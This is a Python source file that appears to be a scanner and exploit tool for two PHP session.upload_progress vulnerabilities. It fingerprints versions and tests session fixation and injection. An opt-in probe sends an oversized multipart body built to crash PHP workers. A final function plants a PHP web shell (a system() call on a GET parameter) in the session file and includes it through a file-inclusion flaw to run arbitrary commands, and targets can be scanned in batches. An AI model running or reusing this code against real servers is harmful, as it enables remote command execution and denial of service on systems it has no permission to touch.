#!/usr/bin/env python3
"""
php2shell scanner Core — CVE-2026-109618/CVE-2026-109619 Vulnerability Check
4-tier progressive detection:
1.Version fingerprint (passive)
2.upload_progress reachability probe (low risk)
3.Session write verification (low risk)
4.OOM differential (opt-in --active, destructive)
Plus: RCE verification (session.upload_progress -> LFI command execution)
Zero external dependencies — stdlib only.
"""
import json
import re
import socket
import ssl
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote
# ── Patched version boundaries ──────────────────────────────────────────────
# Versions >= these are patched for CVE-2026-109618/109619
PATCHED_VERSIONS = {
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}
# session.upload_progress introduced in 5.4.0
VULN_FLOOR = (5, 4, 0)
# ════════════════════════════════════════════════════════════════════════════
#  HTTP layer — raw sockets, no deps
# ════════════════════════════════════════════════════════════════════════════
def _connect(host, port, tls=False, timeout=10):
    raw = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw
def _recv_all(sock, timeout=10):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            chunks.append(d)
        except (socket.timeout, ConnectionResetError, ssl.SSLError, OSError):
            break
    return b"".join(chunks)
def _parse_response(raw):
    """Parse raw HTTP response into (status_code, headers_dict, body_bytes)."""
    if not raw:
        return 0, {}, b""
    if b"\r\n\r\n" in raw:
        head, body = raw.split(b"\r\n\r\n", 1)
    else:
        head, body = raw, b""
    lines = head.split(b"\r\n")
    status_line = lines[0].decode("latin-1", "replace") if lines else ""
    m = re.match(r"HTTP/\d\.\d\s+(\d+)", status_line)
    status = int(m.group(1)) if m else 0
    headers = {}
    for line in lines[1:]:
        decoded = line.decode("latin-1", "replace")
        if ":" in decoded:
            k, v = decoded.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body
def http_request(host, port, method, path, headers=None, body=None,
                 tls=False, timeout=10):
    """Send an HTTP/1.1 request and return (status, headers_dict, body)."""
    hdrs = {"Host": host, "Connection": "close"}
    if headers:
        hdrs.update(headers)
    if body:
        hdrs["Content-Length"] = str(len(body))
    req = f"{method} {path} HTTP/1.1\r\n"
    for k, v in hdrs.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    raw_req = req.encode("latin-1")
    if body:
        raw_req += body if isinstance(body, bytes) else body.encode("latin-1")
    try:
        sock = _connect(host, port, tls=tls, timeout=timeout)
        sock.sendall(raw_req)
        raw_resp = _recv_all(sock, timeout=timeout)
        sock.close()
        return _parse_response(raw_resp)
    except (socket.error, ssl.SSLError, OSError) as e:
        return 0, {}, str(e).encode()
def parse_target(url):
    """Parse URL into (host, port, tls, path).
    Accepts:
      - bare domain/IP: example.com, 192.168.1.1
      - with protocol: http://example.com, https://example.com
      - with port: example.com:8080
      - with path: example.com/index.php, http://x/a/b/c.php
    """
    u = urlparse(url if "://" in url else f"http://{url}")
    tls = u.scheme == "https"
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if tls else 80)
    path = u.path or "/"
    return host, port, tls, path
# ════════════════════════════════════════════════════════════════════════════
#  Version utilities
# ════════════════════════════════════════════════════════════════════════════
def parse_version(ver_str):
    """'8.2.34' -> (8, 2, 34) or None."""
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", ver_str)
    return tuple(int(x) for x in m.groups()) if m else None
def is_vulnerable(ver_tuple):
    """Check if a parsed version tuple is vulnerable."""
    if ver_tuple < VULN_FLOOR:
        return False
    branch = ver_tuple[:2]
    patched = PATCHED_VERSIONS.get(branch)
    if patched is None:
        # EOL branch (5.x, 7.x, 8.0, 8.1) — no fix exists
        return True
    return ver_tuple < patched
def version_recommendation(ver_tuple):
    """Return upgrade recommendation string."""
    if ver_tuple is None:
        return "Unable to determine version — manual check required"
    branch = ver_tuple[:2]
    patched = PATCHED_VERSIONS.get(branch)
    if patched is None:
        return f"PHP {'.'.join(map(str, ver_tuple))} is EOL — upgrade to a supported branch (8.2.35+, 8.3.36+, 8.4.27+)"
    if ver_tuple < patched:
        return f"Upgrade to PHP {'.'.join(map(str, patched))}+"
    return "Version is patched"
# ════════════════════════════════════════════════════════════════════════════
#  Tier 1: Version Fingerprint
# ════════════════════════════════════════════════════════════════════════════
def check_version(host, port, path, tls, timeout=10):
    """Passive version detection from HTTP headers."""
    result = {"version": None, "sapi": None, "vulnerable": None, "source": None}
    status, headers, body = http_request(host, port, "GET", path, tls=tls, timeout=timeout)
    if status == 0:
        result["source"] = "connection_failed"
        return result
    # X-Powered-By: PHP/8.2.34
    xpb = headers.get("x-powered-by", "")
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    if m:
        result["version"] = m.group(1)
        result["source"] = "x-powered-by"
        result["sapi"] = "fpm" if "apache" not in headers.get("server", "").lower() else "mod_php"
    # Server: Apache/2.4.x (Debian) PHP/8.2.34
    server = headers.get("server", "")
    sm = re.search(r"PHP/(\d+\.\d+\.\d+)", server)
    if sm:
        result["version"] = sm.group(1)
        result["source"] = "server-header"
        result["sapi"] = "mod_php"
    # SAPI refinement from Server header
    if result["sapi"] is None:
        sl = server.lower()
        if "apache" in sl:
            result["sapi"] = "mod_php"
        elif "nginx" in sl:
            result["sapi"] = "fpm"
    # Check body for PHP version in error output
    if result["version"] is None and body:
        bm = re.search(rb"PHP/(\d+\.\d+\.\d+)", body)
        if bm:
            result["version"] = bm.group(1).decode()
            result["source"] = "body"
    if result["version"]:
        vt = parse_version(result["version"])
        if vt:
            result["vulnerable"] = is_vulnerable(vt)
    return result
# ════════════════════════════════════════════════════════════════════════════
#  Tier 2: upload_progress Reachability
# ════════════════════════════════════════════════════════════════════════════
def check_upload_progress(host, port, path, tls, timeout=10):
    """Probe whether session.upload_progress processes our request."""
    result = {"reachable": False, "session_fixation": False, "details": ""}
    boundary = "SCANBOUND" + uuid.uuid4().hex[:8]
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"scancheck\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.txt"\r\n\r\n'
        f"X\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    hdrs = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    status, resp_headers, resp_body = http_request(
        host, port, "POST", path, headers=hdrs, body=body, tls=tls, timeout=timeout)
    if status == 0:
        result["details"] = "connection failed"
        return result
    set_cookie = resp_headers.get("set-cookie", "")
    if "PHPSESSID" in set_cookie:
        result["reachable"] = True
        result["details"] = "upload_progress handler active (session created on multipart POST)"
    elif status in (200, 302, 301):
        result["details"] = f"HTTP {status} but no session cookie — endpoint may not call session_start()"
    else:
        result["details"] = f"HTTP {status}"
    # Probe 2: session fixation via POST body (CVE-2026-109619)
    sid2 = "fixcheck" + uuid.uuid4().hex[:16]
    body2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        f"{sid2}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"scancheck\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.txt"\r\n\r\n'
        f"X\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    hdrs2 = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    status2, resp_headers2, _ = http_request(
        host, port, "POST", path, headers=hdrs2, body=body2, tls=tls, timeout=timeout)
    sc2 = resp_headers2.get("set-cookie", "")
    if sid2 in sc2:
        result["reachable"] = True
        result["session_fixation"] = True
        result["details"] = "session fixation via POST body confirmed (pre-PR#22113)"
    elif "PHPSESSID" in sc2 and result["reachable"]:
        result["details"] += " (session fixation blocked — use_only_cookies may be On)"
    return result
# ════════════════════════════════════════════════════════════════════════════
#  Tier 3: Session Write Verification
# ════════════════════════════════════════════════════════════════════════════
def check_session_write(host, port, path, tls, timeout=10):
    """Verify that filenames are stored raw in session (injection primitive)."""
    result = {"injectable": False, "details": ""}
    marker = "___PHP2SHELL_PROBE_" + uuid.uuid4().hex[:8] + "___"
    sid = "writecheck" + uuid.uuid4().hex[:16]
    boundary = "WRITEBOUND" + uuid.uuid4().hex[:8]
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"x\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{marker}"\r\n\r\n'
        f"Z\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Cookie": f"PHPSESSID={sid}",
    }
    status, _, _ = http_request(
        host, port, "POST", path, headers=hdrs, body=body, tls=tls, timeout=timeout)
    if status == 0:
        result["details"] = "injection request failed"
        return result
    status2, _, resp_body = http_request(
        host, port, "GET", path, headers={"Cookie": f"PHPSESSID={sid}"},
        tls=tls, timeout=timeout)
    if marker.encode() in resp_body:
        result["injectable"] = True
        result["details"] = "raw filename found in session response — injection primitive confirmed"
    else:
        result["details"] = "marker not reflected in response (expected unless endpoint dumps session)"
    return result
# ════════════════════════════════════════════════════════════════════════════
#  Tier 4: OOM Differential (opt-in)
# ════════════════════════════════════════════════════════════════════════════
def check_oom(host, port, path, tls, timeout=15):
    """
    Send oversized multipart to trigger memory_limit.
    DESTRUCTIVE — may crash PHP workers.
    """
    result = {"vulnerable": None, "behavior": "", "details": ""}
    base_status, base_headers, _ = http_request(
        host, port, "GET", path, tls=tls, timeout=timeout)
    if base_status == 0:
        result["details"] = "baseline request failed"
        return result
    boundary = "OOMPROBE"
    nested_key = "a" + "[x]" * 60
    parts = []
    for i in range(800):
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{nested_key}{i}"\r\n\r\n'
            f"{'A' * 2048}\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    oom_body = "".join(parts).encode("latin-1")
    hdrs = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    oom_status, oom_headers, oom_body_resp = http_request(
        host, port, "POST", path, headers=hdrs, body=oom_body, tls=tls, timeout=timeout)
    if oom_status == 0:
        result["vulnerable"] = True
        result["behavior"] = "connection_reset"
        result["details"] = "OOM probe caused connection reset — unpatched crash behavior"
    elif oom_status == 502:
        result["vulnerable"] = True
        result["behavior"] = "502_gateway"
        result["details"] = "OOM probe caused 502 — FPM worker crash (unpatched)"
    elif oom_status == 500:
        body_text = oom_body_resp.decode("latin-1", "replace")
        if "Allowed memory size" in body_text:
            result["behavior"] = "memory_error_500"
            result["details"] = "OOM error returned — may be patched (soft OOM) or unpatched"
        elif len(oom_body_resp) == 0:
            result["vulnerable"] = True
            result["behavior"] = "empty_500"
            result["details"] = "Empty HTTP 500 — worker crash without error output (unpatched)"
        else:
            result["behavior"] = "nonempty_500"
            result["details"] = f"HTTP 500 with {len(oom_body_resp)}B body"
    elif oom_status == base_status:
        result["behavior"] = "normal_response"
        result["details"] = f"OOM probe returned HTTP {oom_status} same as baseline — memory_limit not reached or post_max_size blocked"
    else:
        result["behavior"] = f"http_{oom_status}"
        result["details"] = f"OOM probe returned HTTP {oom_status}"
    # Post-OOM: check if the worker is still alive
    post_status, _, _ = http_request(host, port, "GET", path, tls=tls, timeout=timeout)
    if post_status == 0 and base_status > 0:
        result["vulnerable"] = True
        result["details"] += " + worker did not recover"
    elif post_status == 502 and base_status != 502:
        result["vulnerable"] = True
        result["details"] += " + subsequent request got 502 (worker dead)"
    return result
# ════════════════════════════════════════════════════════════════════════════
#  Orchestrator
# ════════════════════════════════════════════════════════════════════════════
def scan(url, active=False, path=None, timeout=10):
    """Run all applicable tiers and return a verdict."""
    host, port, tls, url_path = parse_target(url)
    if path:
        url_path = path
    result = {
        "target": url,
        "host": host,
        "port": port,
        "tls": tls,
        "path": url_path,
        "verdict": "UNKNOWN",
        "confidence": "LOW",
        "version": None,
        "sapi": None,
        "checks": {},
        "chains": [],
        "recommendation": "",
        "error": None,
    }
    # Tier 1: Version
    try:
        v = check_version(host, port, url_path, tls, timeout=timeout)
        result["checks"]["version"] = v
        result["version"] = v["version"]
        result["sapi"] = v["sapi"]
    except Exception as e:
        result["checks"]["version"] = {"error": str(e)}
    # Tier 2: upload_progress
    try:
        up = check_upload_progress(host, port, url_path, tls, timeout=timeout)
        result["checks"]["upload_progress"] = up
    except Exception as e:
        result["checks"]["upload_progress"] = {"error": str(e)}
    # Tier 3: Session write (only if upload_progress is reachable)
    up_result = result["checks"].get("upload_progress", {})
    if up_result.get("reachable"):
        try:
            sw = check_session_write(host, port, url_path, tls, timeout=timeout)
            result["checks"]["session_write"] = sw
        except Exception as e:
            result["checks"]["session_write"] = {"error": str(e)}
    # Tier 4: OOM (only with --active)
    if active:
        try:
            oom = check_oom(host, port, url_path, tls, timeout=max(timeout, 15))
            result["checks"]["oom"] = oom
        except Exception as e:
            result["checks"]["oom"] = {"error": str(e)}
    # ── Verdict ──
    ver = result["checks"].get("version", {})
    up = result["checks"].get("upload_progress", {})
    oom = result["checks"].get("oom", {})
    ver_vuln = ver.get("vulnerable")
    up_reachable = up.get("reachable", False)
    oom_vuln = oom.get("vulnerable")
    if oom_vuln is True:
        result["verdict"] = "VULNERABLE"
        result["confidence"] = "HIGH"
    elif ver_vuln is True and up_reachable:
        result["verdict"] = "VULNERABLE"
        result["confidence"] = "HIGH"
    elif ver_vuln is True:
        result["verdict"] = "VULNERABLE"
        result["confidence"] = "MEDIUM"
    elif ver_vuln is False and not oom_vuln:
        result["verdict"] = "PATCHED"
        result["confidence"] = "HIGH" if up_reachable else "MEDIUM"
    elif up_reachable and ver_vuln is None:
        result["verdict"] = "LIKELY_VULNERABLE"
        result["confidence"] = "MEDIUM"
    elif ver.get("source") == "connection_failed":
        result["verdict"] = "ERROR"
        result["error"] = "connection failed"
    else:
        result["verdict"] = "UNKNOWN"
        result["confidence"] = "LOW"
    # ── Applicable chains ──
    sapi = result["sapi"]
    if result["verdict"] in ("VULNERABLE", "LIKELY_VULNERABLE"):
        result["chains"].append("A")  # session injection + LFI (always if upload_progress works)
        result["chains"].append("B")  # var_destroy UAF
        if sapi == "fpm":
            result["chains"].append("C")  # handler mismatch (FPM only)
        if sapi == "mod_php":
            result["chains"].append("D")  # OOM on mod_php
        if sapi == "fpm":
            result["chains"].append("E")  # stale BG across FPM requests
        if sapi is None:
            result["chains"] = ["A", "B", "C", "D", "E"]
    # ── Recommendation ──
    vt = parse_version(result["version"]) if result["version"] else None
    result["recommendation"] = version_recommendation(vt)
    return result
def scan_batch(urls, active=False, path=None, timeout=10, threads=10,
               on_progress=None, cancel_event=None):
    """Scan multiple URLs concurrently.
    Args:
        urls: list of target URLs
        active: enable destructive OOM probe
        path: override endpoint path
        timeout: per-request timeout
        threads: concurrent workers
        on_progress: callback(done, total, result) — called after each target
        cancel_event: threading.Event — set to abort
    Yields result dicts as they complete.
    """
    def _scan(url):
        return scan(url, active=active, path=path, timeout=timeout)
    results = []
    total = len(urls)
    done = 0
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(_scan, u): u for u in urls}
        for f in as_completed(futures):
            if cancel_event is not None and cancel_event.is_set():
                # drain remaining futures
                for fut in futures:
                    fut.cancel()
                break
            done += 1
            try:
                r = f.result()
            except Exception as e:
                target = futures[f]
                r = {"target": target, "verdict": "ERROR", "error": str(e),
                     "checks": {}, "chains": [], "version": None, "sapi": None,
                     "confidence": "LOW", "recommendation": ""}
            results.append(r)
            if on_progress:
                on_progress(done, total, r)
    return results
# ════════════════════════════════════════════════════════════════════════════
#  RCE Verification — session.upload_progress-->LFI command execution
#  Purpose: confirm findings & cut false positives (run id/whoami on target)
#  Exploit chain (chain "A"):
#    1) multipart POST writes PHP code into the session file via the
#       uploaded filename (PHP stores it raw in $_SESSION).
#    2) LFI endpoint includes that session file-->our PHP executes.
#  LFI entry & param are application-specific-->configurable; session save
#  dirs are auto-tried over the common Linux locations.
# ════════════════════════════════════════════════════════════════════════════
DEFAULT_SESSION_DIRS = [
    "/tmp/",
    "/var/lib/php/sessions/",
    "/var/lib/php/session/",
    "/var/lib/php5/",
    "/var/lib/php/",
    "/var/lib/php/sessions/sess_",
]
RCE_START_MARK = "[RCE-START]"
RCE_END_MARK = "[RCE-END]"


def _rce_payload():
    """PHP payload injected via the uploaded filename.
    Uses single quotes only so it never collides with the
    multipart header's filename=\"...\" double quotes."""
    return ("<?php print'%s';system($_GET['c']);print'%s';?>"
            % (RCE_START_MARK, RCE_END_MARK))


def _build_request_path(base, query_pairs):
    """Build a raw HTTP request target like /index.php?page=...&c=..."""
    path = base or "/"
    if not path.startswith("/"):
        path = "/" + path
    sep = "&" if "?" in path else "?"
    qs = "&".join("%s=%s" % (quote(str(k)), quote(str(v))) for k, v in query_pairs)
    return path + sep + qs


def rce_execute(target, command, lfi_param="page", lfi_path=None,
                injection_url=None, session_dirs=None, timeout=10):
    """Try to run `command` on `target` via session.upload_progress-->LFI.

    Args:
        target: the scanned URL (host/port/tls/path parsed from it)
        command: e.g. "id", "whoami", "uname -a"
        lfi_param: the GET param that triggers the file inclusion
        lfi_path: request path of the LFI entry point (default: scanned path)
        injection_url: request path that handles session.upload_progress
                       (default: scanned path)
        session_dirs: list of dirs that may hold session files (auto-tried)

    Returns a dict:
        ok          — True if RCE marker + output were reflected
        output      — command stdout (between the markers)
        session_dir — which dir actually worked
        used_url    — the LFI request target that fired
        attempts    — per-dir attempt log [{session_dir, status}]
        details     — human-readable note / failure reason
        error       — None or a string
    """
    host, port, tls, base_path = parse_target(target)
    if injection_url is None:
        injection_url = base_path
    if lfi_path is None:
        lfi_path = base_path
    if session_dirs is None:
        session_dirs = list(DEFAULT_SESSION_DIRS)

    sid = "rce" + uuid.uuid4().hex[:16]
    boundary = "RCEBOUND" + uuid.uuid4().hex[:8]
    payload = _rce_payload()
    body = (
        "--%s\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n"
        "--%s\r\n"
        'Content-Disposition: form-data; name="f"; filename="%s"\r\n\r\n'
        "Z\r\n"
        "--%s--\r\n"
    ) % (boundary, boundary, payload, boundary)
    body = body.encode("latin-1")
    hdrs = {
        "Content-Type": "multipart/form-data; boundary=%s" % boundary,
        "Cookie": "PHPSESSID=%s" % sid,
    }
    # 1) Inject PHP code into the session file
    inj_status, _, _ = http_request(host, port, "POST", injection_url,
                                    headers=hdrs, body=body,
                                    tls=tls, timeout=timeout)
    if inj_status == 0:
        return {"ok": False, "output": "", "session_dir": None, "used_url": None,
                "attempts": [], "error": "injection connection failed",
                "details": "Injection POST failed (connection error). Check the injection URL."}

    # 2) For each candidate session dir, LFI-include the session file
    attempts = []
    last_path = None
    for sd in session_dirs:
        sd = (sd or "").strip()
        if sd and not sd.endswith("/"):
            sd += "/"
        session_file = "%ssess_%s" % (sd, sid)
        qs_pairs = [(lfi_param, session_file), ("c", command)]
        cmd_path = _build_request_path(lfi_path, qs_pairs)
        last_path = cmd_path
        status, _, resp_body = http_request(
            host, port, "GET", cmd_path,
            headers={"Cookie": "PHPSESSID=%s" % sid},
            tls=tls, timeout=timeout)
        attempts.append({"session_dir": sd, "status": status})
        if status == 0:
            continue
        body_text = resp_body.decode("latin-1", "replace")
        s = body_text.find(RCE_START_MARK)
        if s < 0:
            continue
        e = body_text.find(RCE_END_MARK, s + len(RCE_START_MARK))
        if e < 0:
            continue
        output = body_text[s + len(RCE_START_MARK):e]
        return {"ok": True, "output": output.strip(), "session_dir": sd,
                "used_url": cmd_path, "attempts": attempts,
                "error": None,
                "details": "Command executed via %s" % sd}

    # 3) Not confirmed
    return {"ok": False, "output": "", "session_dir": None, "used_url": last_path,
            "attempts": attempts, "error": None,
            "details": ("Injection sent (HTTP %s) but no RCE marker reflected. "
                        "Check the LFI path/param and session save dir."
                        % inj_status)}
